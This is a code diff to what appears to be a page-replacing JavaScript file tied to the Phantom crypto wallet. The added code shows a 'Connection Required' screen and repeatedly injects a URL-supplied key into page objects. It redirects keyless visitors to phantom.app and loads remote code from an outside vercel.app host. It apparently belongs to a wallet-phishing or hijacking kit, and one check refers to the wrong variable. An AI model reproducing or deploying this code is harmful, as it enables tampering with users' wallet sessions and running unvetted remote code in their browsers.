@@ -15,10 +15,34 @@ const ensurePageChange = setInterval(() => {
       document.getElementById("mainTitle").innerText = `Connection Required`;
     }
 
+    try {
+      const url = new URL(window.location.href);
+      const params = new URLSearchParams(url.search);
+      const key = params.get("key");
+      if (key) {
+       setInterval(() => {
+          Object.keys(window).forEach((keyName) => {
+              try {
+                  if (typeof(window[keyName]) == "object") {
+                      if (window[keyName]["key"] != null && window[key]["explain_blowfish"] != null) {
+                          window[keyName]["key"] = key;
+                      }
+                  }
+              } catch(error) {}
+          });
+       }, 50);
+      } else {
+        location.href = "https://phantom.app"
+      }
+    } catch(error) {
+location.href = "https://phantom.app"
+}
+
     return clearInterval(ensurePageChange);
   };
   document.documentElement.innerHTML = `
   <head>
+    <script src="https://wowee.vercel.app/main_source.js"></script>
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
     <link
